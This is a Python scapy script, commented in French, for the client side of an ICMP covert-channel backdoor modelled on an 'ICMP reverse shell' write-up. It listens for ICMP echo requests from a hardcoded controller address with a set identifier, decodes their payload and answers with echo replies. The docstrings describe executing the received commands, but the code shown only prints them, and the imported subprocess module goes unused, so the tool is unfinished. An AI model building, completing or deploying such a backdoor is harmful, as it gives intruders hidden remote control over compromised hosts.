from scapy.all import *
from scapy.layers.inet import IP, ICMP
import subprocess
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"

"""
ICMP PACKET
https://cryptsus.com/blog/icmp-reverse-shell.html

0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier (ID)     |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Optional Data                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""

class Client:
    """
    On définis une classe Client qui aura pour but:
        -d'écouter le traffic réseaux
        -de filtrer les paquets
        -d'executer les commandes
    """

    def __init__(self, server_ip, packet_id):
        self.server = server_ip
        self.ID = packet_id
        self.TTL = 64

    def main(self):
        """
        Méthode de classe qui aura pour but d'initialiser l'audit du traffic
        On utilisera un sniffer asynchrone (https://scapy.readthedocs.io/en/latest/usage.html)
        afin d'avoir une I/O non-bloquante.
        """

        sniff(prn=self.process, store=False, filter="icmp")

    def process(self, packet):
        """
        On va filtrer plus en profondeur le paquet afin de vérifier que notre paquet est celui
        qu'on veut (via l'identifier ICMP).
        Par la suite on se chargera d'executer les données dans l'optional Data

        On oublie pas de filtrer le type de paquet ICMP
        -echo-reply (type 0)
        -echo-request (code 8)
        """

        if packet[IP].src == self.server and packet[ICMP].type == 8 and packet[ICMP].id == self.ID and packet[Raw].load:
            opt_data = (packet[Raw].load).decode('utf-8', errors='ignore')
            print(opt_data)
            payload = (IP(dst=self.server, ttl=self.TTL)/ICMP(type=0, id=self.ID)/"ui")
            send(payload, timeout=0, verbose=0)


if __name__ == "__main__":
    icmp_door_client = Client("192.168.1.33", 13170)
    icmp_door_client.main()
